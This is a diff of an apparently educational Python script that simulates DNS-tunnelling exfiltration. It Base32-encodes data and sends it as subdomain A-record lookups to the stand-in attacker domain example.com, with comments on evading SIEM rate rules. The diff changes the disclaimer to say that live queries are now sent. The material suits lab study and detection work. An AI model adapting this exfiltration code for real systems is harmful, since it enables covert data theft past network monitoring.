@@ -1,24 +1,23 @@
 """
-Important: this is not a malware, this project is purely educational. 
-It does not capture, send, or transmit any data. 
-All code execution is local and fully contained within the files themselves.
+Disclaimer: All offensive components are limited to proof-of-concept simulations intended for use in isolated lab environments only.
 
-This file simulates a malware that:
+This file simulates a malware inside a client's infected device that:
 Takes imaginary sensitive data
 Encodes it using Base32
-Exfiltrates it through DNS queries
+Exfiltrates it through LIVE DNS queries over the network to example.com
+(example.com is explicitly reserved by IANA for Documentation / Examples / Testing)
 
 This is a commonly used method by attackers because:
 DNS traffic is rarely inspected in depth
-Port 53 is almost always allowed
+UDP Port 53 is almost always allowed
 It works even in locked down networks
 """
 
 import base64               # use base32 to ensure all characters are DNS valid
 import dns.resolver         # uses dnspython instead of raw sockets
-import time                 # add delays to avoid rate based SIEM rules
+import time                 # add delays to try and avoid rate based SIEM rules
 
-domain = "example.com"      # domain controlled by attacker
+domain = "example.com"      # hypothetical domain controlled by attacker 
 chunk_size = 30             # safe DNS label size (max size is 63 chars)
 
 # this function prepares data passed into it for DNS transport by encoding it in base32
@@ -42,8 +41,8 @@ def send_dns_queries(chunks):
 
         # send 'A' record lookup (most common DNS query, blends in with normal traffic)
         try:
-            resolver.resolve(subdomain, "A")
-            print(f"[+] Sent: {subdomain}")
+            resolver.resolve(subdomain, "A")    # live query will be sent, able to study it's PCAP
+            print(f"Sent: {subdomain}")
         except:
             pass
 
